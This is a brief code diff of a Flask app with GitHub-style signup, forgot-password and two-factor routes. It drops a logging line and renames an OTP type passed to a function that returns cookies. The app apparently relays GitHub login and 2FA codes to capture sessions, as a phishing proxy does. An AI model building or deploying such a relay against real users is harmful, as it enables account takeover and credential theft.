@@ -27,7 +27,6 @@ def forgot_password():
 @app.route("/signup", methods=["GET"])
 def signup():
     source = request.args.get("source")
-    print(f"Redirecting to signup page from source: {source}")
     return redirect("https://github.com/signup?source=login")
 
 
@@ -117,7 +116,7 @@ def post_two_fa():
 
     # Determine which function to call based on the OTP type
     if app_otp:
-        response_html, status, cookies = execute_2fa_otp(app_otp, "app_otp")
+        response_html, status, cookies = execute_2fa_otp(app_otp, "otp")
     elif sms_otp:
         response_html, status, cookies = execute_2fa_otp(sms_otp, "sms_otp")
 
